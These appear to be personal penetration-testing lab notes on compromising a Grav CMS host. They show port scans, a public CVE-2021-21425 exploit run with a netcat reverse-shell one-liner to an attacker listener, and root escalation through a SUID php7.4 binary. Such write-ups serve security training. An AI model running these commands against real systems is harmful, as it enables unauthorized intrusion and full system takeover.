Linux ttl=61

# rustscan

```
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 61
80/tcp open  http    syn-ack ttl 61
```

# nmap

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 98:4e:5d:e1:e6:97:29:6f:d9:e0:d4:82:a8:f6:4f:3f (RSA)
|   256 57:23:57:1f:fd:77:06:be:25:66:61:14:6d:ae:5e:98 (ECDSA)
|_  256 c7:9b:aa:d5:a6:33:35:91:34:1e:ef:cf:61:a8:30:1c (ED25519)
80/tcp open  http    Apache httpd 2.4.41
|_http-title: Index of /
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-ls: Volume /
| SIZE  TIME              FILENAME
| -     2021-03-17 17:46  grav-admin/
```

# initial

Grav CMS was running on it

just easy search on google

![[Pasted image 20240618002344.png]]

![[Pasted image 20240618002410.png]]

both worked but prefer github one

https://github.com/CsEnox/CVE-2021-21425/blob/main/exploit.py

![[Pasted image 20240618002518.png]]

it says it worked but not received any output so try with rev shell

```
python3 exploit.py -t http://192.168.225.12/grav-admin -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 192.168.45.178 80 >/tmp/f'
```

got it!

# priv esc

```
find / -type f -perm -4000 2>/dev/null
```

SUID

```
/usr/bin/php7.4 -r "pcntl_exec('/bin/sh', ['-p']);"
```